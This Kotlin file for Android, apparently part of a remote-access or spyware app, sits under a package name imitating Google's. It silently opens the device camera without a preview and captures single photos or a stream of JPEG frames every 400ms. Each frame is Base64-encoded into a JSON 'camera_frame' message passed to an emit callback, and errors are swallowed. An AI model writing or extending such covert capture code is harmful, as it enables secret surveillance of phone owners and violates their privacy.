package com.google.xmoder

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import org.json.JSONObject

object CameraStreamer {
    private var dev: CameraDevice? = null
    private var sess: CameraCaptureSession? = null
    private var read: ImageReader? = null
    private var th: HandlerThread? = null
    private var isLiveMode = false
    private var isRunning = false

    fun start(ctx: Context, facing: Int, isLive: Boolean, emit: (JSONObject) -> Unit) {
        try {
            // Matikan stream lama dulu biar ga tabrakan
            stop()
            isLiveMode = isLive
            isRunning = true

            val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = m.cameraIdList.firstOrNull { 
                m.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing 
            } ?: return
            
            th = HandlerThread("cam_thread").also { it.start() }
            val h = Handler(th!!.looper)
            
            // 480x360 biar ringan
            read = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 2)
            read!!.setOnImageAvailableListener({ r ->
                if (!isRunning) return@setOnImageAvailableListener
                try {
                    val i = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val b = ByteArray(i.planes[0].buffer.remaining())
                    i.planes[0].buffer.get(b)
                    i.close()
                    
                    val payload = JSONObject()
                    payload.put("action", "camera_frame")
                    payload.put("data", Base64.encodeToString(b, Base64.NO_WRAP))
                    emit(payload)
                    
                    // Kalau mode foto, langsung matiin
                    if (!isLiveMode) {
                        Handler(android.os.Looper.getMainLooper()).post { stop() }
                    }
                } catch (e: Exception) { }
            }, h)
            
            m.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    try {
                        dev = c
                        val r = c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        r.addTarget(read!!.surface)
                        
                        c.createCaptureSession(listOf(read!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    sess = s
                                    if (isLiveMode) {
                                        // Mode Live: ambil gambar tiap 400ms
                                        s.setRepeatingRequest(r.build(), object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                try {
                                                    Thread.sleep(400)
                                                } catch (e: Exception) {}
                                            }
                                        }, h)
                                    } else {
                                        // Mode Foto: cuma capture sekali
                                        s.capture(r.build(), object : CameraCaptureSession.CaptureCallback() {}, h)
                                    }
                                } catch (e: Exception) { }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {}
                        }, h)
                    } catch (e: Exception) { }
                }
                override fun onDisconnected(c: CameraDevice) {}
                override fun onError(c: CameraDevice, e: Int) {}
            }, h)
            
        } catch (e: Exception) {
            e.printStackTrace()
            stop()
        }
    }
    
    fun stop() {
        isRunning = false
        isLiveMode = false
        try {
            sess?.stopRepeating()
            sess?.close()
            sess = null
            dev?.close()
            dev = null
            read?.close()
            read = null
            th?.quitSafely()
            th = null
        } catch (e: Exception) { }
    }
}
